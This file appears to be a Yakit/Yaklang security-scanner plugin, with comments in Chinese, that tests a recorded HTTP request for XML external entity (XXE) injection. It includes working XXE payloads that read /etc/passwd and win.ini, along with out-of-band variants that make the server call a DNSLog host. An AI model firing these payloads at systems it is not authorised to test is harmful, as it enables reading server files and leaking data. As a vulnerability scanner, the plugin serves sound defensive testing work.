@@ -1,0 +1,544 @@
+__DESC__ = "检测 XML 外部实体注入 (XXE) 漏洞，支持带外检测（DNSLog）和文件读取检测"
+__VERBOSE_NAME__ = "XXE 外部实体注入检测"
+__KEYWORDS__ = "xxe,xml,external-entity,out-of-band,dnslog,file-read"
+
+// 配置项
+debug = false
+
+// -------------------------------------------------------------------
+// CLI 参数定义
+// -------------------------------------------------------------------
+flowIDStr = cli.String(
+    "httpflow-id", 
+    cli.setVerboseName("HTTPFlowID"), 
+    cli.setHelp("History 中的 HTTPFlow ID,用于获取请求/响应包内容"), 
+    cli.setRequired(true), 
+)
+cli.check()
+
+// 辅助输出函数
+aiOut = msg => { 
+    try {
+        yakit.AIOutput(msg) 
+    } catch {
+        println(msg)
+    }
+}
+
+// -------------------------------------------------------------------
+// 核心逻辑
+// -------------------------------------------------------------------
+
+// 判断是否为 XML 请求
+isXMLRequest = func(contentType, body) {
+    // 检查 Content-Type
+    if contentType != "" {
+        ct = str.ToLower(contentType)
+        if str.Contains(ct, "xml") {
+            return true
+        }
+    }
+    
+    // 检查 Body 内容
+    return isXMLContent(body)
+}
+
+// 判断内容是否为 XML
+isXMLContent = func(content) {
+    if content == nil || len(content) == 0 { return false }
+    
+    contentStr = str.ToLower(string(content))
+    contentStr = str.TrimSpace(contentStr)
+    
+    if str.HasPrefix(contentStr, "<?xml") { return true }
+    if str.HasPrefix(contentStr, "<!doctype") { return true }
+    
+    // 简单的 XML 标签检测（至少有一对完整标签）
+    if str.MatchAnyOfRegexp(contentStr, `^<[a-z][a-z0-9]*>.*</[a-z][a-z0-9]*>$`) {
+        return true
+    }
+    
+    return false
+}
+
+// 提取根标签名
+extractRootTag = func(xmlBody) {
+    bodyStr = string(xmlBody)
+    
+    // 跳过 <?xml 声明
+    startIdx = 0
+    if str.HasPrefix(bodyStr, "<?xml") {
+        startIdx = str.Index(bodyStr, "?>")
+        if startIdx > 0 {
+            startIdx = startIdx + 2
+        }
+    }
+    
+    // 跳过 <!DOCTYPE
+    for str.Contains(bodyStr[startIdx:], "<!DOCTYPE") {
+        doctypeStart = str.Index(bodyStr[startIdx:], "<!DOCTYPE")
+        doctypeEnd = str.Index(bodyStr[startIdx+doctypeStart:], ">")
+        if doctypeEnd > 0 {
+            startIdx = startIdx + doctypeStart + doctypeEnd + 1
+        } else {
+            break
+        }
+    }
+    
+    // 找到第一个标签
+    tagStart = str.Index(bodyStr[startIdx:], "<")
+    if tagStart < 0 { return "root" }
+    
+    tagStart = startIdx + tagStart + 1
+    tagEnd = tagStart
+    
+    // 找到标签名结束位置（空格或 >）
+    for tagEnd < len(bodyStr) {
+        c = bodyStr[tagEnd]
+        if c == ' ' || c == '>' || c == '\t' || c == '\n' {
+            break
+        }
+        tagEnd = tagEnd + 1
+    }
+    
+    rootTag = bodyStr[tagStart:tagEnd]
+    if rootTag == "" { return "root" }
+    
+    return rootTag
+}
+
+// 构造 XXE Payload（带外型）
+buildOOBPayload = func(reverseURL, rootTag) {
+    payloads = []
+    
+    // Payload 1: 基础外部实体（HTTP）
+    p1 = sprintf(`<?xml version="1.0"?>
+<!DOCTYPE %s [
+  <!ENTITY xxe SYSTEM "http://%s/basic">
+]>`, rootTag, reverseURL)
+    payloads = append(payloads, {"dtd": p1, "entity": "&xxe;", "desc": "Basic External Entity"})
+    
+    // Payload 2: 参数实体
+    p2 = sprintf(`<?xml version="1.0"?>
+<!DOCTYPE %s [
+  <!ENTITY %% xxe SYSTEM "http://%s/param">
+  %%xxe;
+]>`, rootTag, reverseURL)
+    payloads = append(payloads, {"dtd": p2, "entity": "", "desc": "Parameter Entity"})
+    
+    // Payload 3: 外部 DTD（更隐蔽）
+    p3 = sprintf(`<?xml version="1.0"?>
+<!DOCTYPE %s SYSTEM "http://%s/external.dtd">`, rootTag, reverseURL)
+    payloads = append(payloads, {"dtd": p3, "entity": "", "desc": "External DTD"})
+    
+    return payloads
+}
+
+// 构造文件读取 Payload
+buildFileReadPayload = func(rootTag) {
+    payloads = []
+    
+    // Linux: /etc/passwd
+    p1 = sprintf(`<?xml version="1.0"?>
+<!DOCTYPE %s [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>`, rootTag)
+    payloads = append(payloads, {"dtd": p1, "entity": "&xxe;", "regex": `root:.*:0:0:`, "desc": "Linux /etc/passwd"})
+    
+    // Windows: win.ini
+    p2 = sprintf(`<?xml version="1.0"?>
+<!DOCTYPE %s [
+  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
+]>`, rootTag)
+    payloads = append(payloads, {"dtd": p2, "entity": "&xxe;", "regex": `\[extensions\]|\[fonts\]`, "desc": "Windows win.ini"})
+    
+    return payloads
+}
+
+// 注入 XXE 到原始 XML
+injectXXE = func(originalBody, dtdPayload, entityPayload) {
+    bodyStr = string(originalBody)
+    
+    // 移除原有的 <?xml 和 <!DOCTYPE（如果存在）
+    cleanBody = bodyStr
+    
+    // 移除 <?xml
+    if str.HasPrefix(cleanBody, "<?xml") {
+        xmlEnd = str.Index(cleanBody, "?>")
+        if xmlEnd > 0 {
+            cleanBody = cleanBody[xmlEnd+2:]
+        }
+    }
+    
+    // 移除 <!DOCTYPE
+    for str.Contains(cleanBody, "<!DOCTYPE") {
+        doctypeStart = str.Index(cleanBody, "<!DOCTYPE")
+        doctypeEnd = str.Index(cleanBody[doctypeStart:], ">")
+        if doctypeEnd > 0 {
+            cleanBody = cleanBody[:doctypeStart] + cleanBody[doctypeStart+doctypeEnd+1:]
+        } else {
+            break
+        }
+    }
+    
+    cleanBody = str.TrimSpace(cleanBody)
+    
+    // 如果有 entity，需要注入到某个元素中
+    if entityPayload != "" {
+        // 简单策略：找到第一个 > 后的内容，插入 entity
+        firstTagEnd = str.Index(cleanBody, ">")
+        if firstTagEnd > 0 {
+            // 检查是否是自闭合标签
+            if firstTagEnd > 0 && cleanBody[firstTagEnd-1] == '/' {
+                // 自闭合标签，需要改造
+                cleanBody = cleanBody[:firstTagEnd-1] + ">" + entityPayload + "</" + extractRootTag([]byte(cleanBody)) + ">"
+            } else {
+                // 在第一个标签内插入
+                nextTagStart = str.Index(cleanBody[firstTagEnd+1:], "<")
+                if nextTagStart > 0 {
+                    insertPos = firstTagEnd + 1
+                    cleanBody = cleanBody[:insertPos] + entityPayload + cleanBody[insertPos:]
+                } else {
+                    cleanBody = cleanBody[:firstTagEnd+1] + entityPayload + cleanBody[firstTagEnd+1:]
+                }
+            }
+        }
+    }
+    
+    // 组合最终 Payload
+    return dtdPayload + "\n" + cleanBody
+}
+
+// XXE 检测核心函数（可复用）
+// 优化版：先快速检测（文件读取），后慢速检测（DNSLog）
+testXXE = func(url, xmlContent, sendFunc) {
+    results = []
+
+    rootTag = extractRootTag([]byte(xmlContent))
+
+    // ====================================================================
+    // 阶段 1: 文件读取检测（快速，有明确回显）
+    // ====================================================================
+    aiOut("  [1/2] 文件读取检测（快速模式）...")
+
+    fileReadPayloads = buildFileReadPayload(rootTag)
+    fileReadSuccess = 0
+
+    for i, p = range fileReadPayloads {
+        aiOut(sprintf("    [%d/%d] 测试: %s", i+1, len(fileReadPayloads), p.desc))
+
+        injectedXML = injectXXE([]byte(xmlContent), p.dtd, p.entity)
+        reqRaw, respRaw = sendFunc(string(injectedXML))
+
+        if respRaw != nil {
+            body, _ = str.ExtractBodyFromHTTPResponseRaw(respRaw)
+            if str.MatchAnyOfRegexp(string(body), p.regex) {
+                aiOut(sprintf("    ✓ 成功读取文件: %s", p.desc))
+                results = append(results, {
+                    "type": "file-read",
+                    "desc": p.desc,
+                    "request": reqRaw,
+                    "response": respRaw
+                })
+                fileReadSuccess++
+            } else {
+                aiOut(sprintf("    × 未检测到文件内容"))
+            }
+        } else {
+            aiOut(sprintf("    × 请求失败"))
+        }
+    }
+
+    // 如果文件读取成功，直接返回结果，跳过 DNSLog 检测
+    if fileReadSuccess > 0 {
+        aiOut(sprintf("  → 发现 %d 个文件读取漏洞，跳过 DNSLog 检测（性能优化）", fileReadSuccess))
+        return results
+    }
+
+    aiOut("  × 文件读取未成功，继续 DNSLog 检测...")
+
+    // ====================================================================
+    // 阶段 2: 带外检测（慢速，需要等待）
+    // ====================================================================
+    aiOut("  [2/2] DNSLog 带外检测...")
+
+    server, token, err := risk.NewDNSLogDomain()
+    if err != nil {
+        aiOut(sprintf("  ! DNSLog 服务不可用: %v", err))
+        return results  // DNSLog 失败，直接返回空结果
+    }
+
+    aiOut(sprintf("  → DNSLog 域名: %s", server))
+
+    randPrefix = str.RandStr(10)
+    reverseURL = randPrefix + "." + server
+
+    oobPayloads = buildOOBPayload(reverseURL, rootTag)
+
+    lastReq = nil
+    lastResp = nil
+
+    for i, p = range oobPayloads {
+        aiOut(sprintf("    [%d/%d] 发送: %s", i+1, len(oobPayloads), p.desc))
+        injectedXML = injectXXE([]byte(xmlContent), p.dtd, p.entity)
+        reqRaw, respRaw = sendFunc(string(injectedXML))
+        if reqRaw != nil { lastReq = reqRaw }
+        if respRaw != nil { lastResp = respRaw }
+    }
+
+    aiOut("  ⏳ 等待 DNSLog 响应（5秒）...")
+    sleep(5)
+
+    detail, _ := risk.CheckDNSLogByToken(token)
+
+    if len(detail) > 0 {
+        aiOut(sprintf("  ✓ DNSLog 收到回调: %d 条记录", len(detail)))
+        results = append(results, {
+            "type": "out-of-band",
+            "desc": "Out-of-Band via DNSLog",
+            "dnslog_domain": server,
+            "records": detail,
+            "request": lastReq,
+            "response": lastResp
+        })
+    } else {
+        aiOut("  × DNSLog 未收到回调")
+    }
+
+    return results
+}
+
+// -------------------------------------------------------------------
+// 主程序入口
+// -------------------------------------------------------------------
+
+flowID = parseInt(flowIDStr)
+flowsChan := db.QueryHTTPFlowsByID(flowID)
+flow = nil
+for f := range flowsChan {
+    flow = f
+    break
+}
+
+if flow == nil {
+    aiOut(sprintf("HTTPFlow 查询失败: 未找到 ID 为 %v 的请求", flowID))
+    return
+}
+
+reqBytes = flow.GetRequest()
+if reqBytes == nil { reqBytes = []byte(flow.Request) }
+if reqBytes == nil || len(reqBytes) == 0 {
+    aiOut("请求包为空,无法检测")
+    return
+}
+
+isHttps = flow.IsHTTPS
+freq, err := fuzz.HTTPRequest(reqBytes, fuzz.https(isHttps))
+if err != nil {
+    aiOut(sprintf("解析请求失败: %v", err))
+    return
+}
+
+aiOut(sprintf("开始 XXE 漏洞检测 (Target: %s)...", flow.Url))
+
+// -------------------------------------------------------------------
+// 场景 1: 整个 Body 是 XML
+// -------------------------------------------------------------------
+contentType = freq.GetHeader("Content-Type")
+originalBody = freq.GetBody()
+
+if isXMLRequest(contentType, originalBody) {
+    aiOut(">>> 检测到完整 XML Body，开始注入测试")
+    
+    rootTag = extractRootTag(originalBody)
+    aiOut(sprintf("XML 根标签: <%s>", rootTag))
+    
+    // 定义发送函数
+    sendFullBodyXML = func(injectedXML) {
+        freq.FuzzHTTPHeader("Content-Length", sprintf("%d", len(injectedXML)))
+        res, _ = freq.FuzzPostRaw(injectedXML).ExecFirst()
+        if res != nil {
+            return res.RequestRaw, res.ResponseRaw
+        }
+        return nil, nil
+    }
+    
+    results = testXXE(flow.Url, string(originalBody), sendFullBodyXML)
+    
+    // 报告结果
+    for _, r = range results {
+        if r.type == "out-of-band" {
+            aiOut(sprintf("✓ XXE 漏洞确认（带外检测 - Full Body）"))
+            risk.NewRisk(
+                flow.Url,
+                risk.title(sprintf("XXE (Out-of-Band): %s", flow.Url)),
+                risk.titleVerbose(sprintf("XML 外部实体注入漏洞: %s", flow.Url)),
+                risk.details(r),
+                risk.type("xxe"),
+                risk.severity("critical"),
+                risk.request(r.request),
+                risk.response(r.response),
+                risk.description("通过 DNSLog 带外检测确认 XXE 漏洞存在（Full Body XML）。"),
+                risk.solution("1. 禁用外部实体解析。\n2. 使用安全的 XML 解析器配置。")
+            )
+        } else if r.type == "file-read" {
+            aiOut(sprintf("✓ XXE 漏洞确认（文件读取 - Full Body: %s）", r.desc))
+            risk.NewRisk(
+                flow.Url,
+                risk.title(sprintf("XXE (File Read): %s", flow.Url)),
+                risk.titleVerbose(sprintf("XML 外部实体注入漏洞: %s", flow.Url)),
+                risk.details(r),
+                risk.type("xxe"),
+                risk.severity("critical"),
+                risk.request(r.request),
+                risk.response(r.response),
+                risk.description(sprintf("成功通过 XXE 读取系统文件: %s", r.desc)),
+                risk.solution("1. 禁用外部实体解析。\n2. 使用安全的 XML 解析器配置。")
+            )
+        }
+    }
+    
+    aiOut("=== XXE 检测完成 ===")
+    return
+}
+
+// -------------------------------------------------------------------
+// 场景 2: 参数中包含 XML
+// -------------------------------------------------------------------
+aiOut(">>> Body 不是完整 XML，检查参数中是否包含 XML...")
+
+allParams = freq.GetCommonParams()
+xmlParams = []
+normalParams = []
+
+for param in allParams {
+    paramValue = param.Value()
+    if isXMLContent([]byte(paramValue)) {
+        xmlParams = append(xmlParams, param)
+        aiOut(sprintf("发现 XML 参数: %s (位置: %s)", param.Name(), param.PositionVerbose()))
+    } else {
+        normalParams = append(normalParams, param)
+    }
+}
+
+// 测试已知的 XML 参数
+for xmlParam in xmlParams {
+    aiOut(sprintf("\n>>> 测试参数: %s (已有 XML 内容)", xmlParam.Name()))
+    
+    originalXML = xmlParam.Value()
+    rootTag = extractRootTag([]byte(originalXML))
+    aiOut(sprintf("参数 XML 根标签: <%s>", rootTag))
+    
+    sendParamXML = func(injectedXML) {
+        res, _ = xmlParam.Fuzz(injectedXML).ExecFirst()
+        if res != nil {
+            return res.RequestRaw, res.ResponseRaw
+        }
+        return nil, nil
+    }
+    
+    results = testXXE(flow.Url, originalXML, sendParamXML)
+    
+    for _, r = range results {
+        if r.type == "out-of-band" {
+            aiOut(sprintf("✓ XXE 漏洞确认（带外检测 - 参数: %s）", xmlParam.Name()))
+            risk.NewRisk(
+                flow.Url,
+                risk.title(sprintf("XXE (Out-of-Band, Param: %s): %s", xmlParam.Name(), flow.Url)),
+                risk.titleVerbose(sprintf("XML 外部实体注入漏洞（参数级）: %s", flow.Url)),
+                risk.details({"param": xmlParam.Name(), "detection": r}),
+                risk.type("xxe"),
+                risk.severity("critical"),
+                risk.request(r.request),
+                risk.response(r.response),
+                risk.description(sprintf("通过 DNSLog 带外检测确认参数 %s 存在 XXE 漏洞。", xmlParam.Name())),
+                risk.solution("1. 禁用外部实体解析。\n2. 使用安全的 XML 解析器配置。")
+            )
+        } else if r.type == "file-read" {
+            aiOut(sprintf("✓ XXE 漏洞确认（文件读取 - 参数: %s, 文件: %s）", xmlParam.Name(), r.desc))
+            risk.NewRisk(
+                flow.Url,
+                risk.title(sprintf("XXE (File Read, Param: %s): %s", xmlParam.Name(), flow.Url)),
+                risk.titleVerbose(sprintf("XML 外部实体注入漏洞（参数级）: %s", flow.Url)),
+                risk.details({"param": xmlParam.Name(), "detection": r}),
+                risk.type("xxe"),
+                risk.severity("critical"),
+                risk.request(r.request),
+                risk.response(r.response),
+                risk.description(sprintf("通过参数 %s 成功读取系统文件: %s", xmlParam.Name(), r.desc)),
+                risk.solution("1. 禁用外部实体解析。\n2. 使用安全的 XML 解析器配置。")
+            )
+        }
+    }
+}
+
+// -------------------------------------------------------------------
+// 场景 3: 强制 Fuzz（即使原始参数不是 XML）
+// -------------------------------------------------------------------
+if len(xmlParams) == 0 {
+    aiOut(">>> 未发现 XML 参数，进入强制 Fuzz 模式")
+} else {
+    aiOut(">>> 继续对普通参数进行强制 XXE Fuzz")
+}
+
+if len(normalParams) == 0 && len(xmlParams) == 0 {
+    aiOut("未发现任何参数，跳过检测")
+    aiOut("=== XXE 检测完成 ===")
+    return
+}
+
+// 对普通参数注入简单的 XXE Payload
+for param in normalParams {
+    aiOut(sprintf("\n>>> 强制 Fuzz 参数: %s", param.Name()))
+    
+    // 构造一个简单的 XXE Payload（用原始值作为默认内容）
+    originalValue = param.Value()
+    if originalValue == "" { originalValue = "test" }
+    
+    simpleXML = sprintf("<root>%s</root>", originalValue)
+    rootTag = "root"
+    
+    sendParamXML = func(injectedXML) {
+        res, _ = param.Fuzz(injectedXML).ExecFirst()
+        if res != nil {
+            return res.RequestRaw, res.ResponseRaw
+        }
+        return nil, nil
+    }
+    
+    results = testXXE(flow.Url, simpleXML, sendParamXML)
+    
+    for _, r = range results {
+        if r.type == "out-of-band" {
+            aiOut(sprintf("✓ XXE 漏洞确认（强制 Fuzz - 参数: %s）", param.Name()))
+            risk.NewRisk(
+                flow.Url,
+                risk.title(sprintf("XXE (Blind, Param: %s): %s", param.Name(), flow.Url)),
+                risk.titleVerbose(sprintf("XML 外部实体注入漏洞（盲测）: %s", flow.Url)),
+                risk.details({"param": param.Name(), "detection": r, "fuzz_mode": "forced"}),
+                risk.type("xxe"),
+                risk.severity("critical"),
+                risk.request(r.request),
+                risk.response(r.response),
+                risk.description(sprintf("通过强制 XXE Fuzz 确认参数 %s 会被后端解析为 XML。", param.Name())),
+                risk.solution("1. 禁用外部实体解析。\n2. 使用安全的 XML 解析器配置。")
+            )
+        } else if r.type == "file-read" {
+            aiOut(sprintf("✓ XXE 漏洞确认（强制 Fuzz - 参数: %s, 文件: %s）", param.Name(), r.desc))
+            risk.NewRisk(
+                flow.Url,
+                risk.title(sprintf("XXE (Blind File Read, Param: %s): %s", param.Name(), flow.Url)),
+                risk.titleVerbose(sprintf("XML 外部实体注入漏洞（盲测）: %s", flow.Url)),
+                risk.details({"param": param.Name(), "detection": r, "fuzz_mode": "forced"}),
+                risk.type("xxe"),
+                risk.severity("critical"),
+                risk.request(r.request),
+                risk.response(r.response),
+                risk.description(sprintf("通过强制 XXE Fuzz 成功读取系统文件: %s（参数: %s）", r.desc, param.Name())),
+                risk.solution("1. 禁用外部实体解析。\n2. 使用安全的 XML 解析器配置。")
+            )
+        }
+    }
+}
+
+aiOut("=== XXE 检测完成 ===")
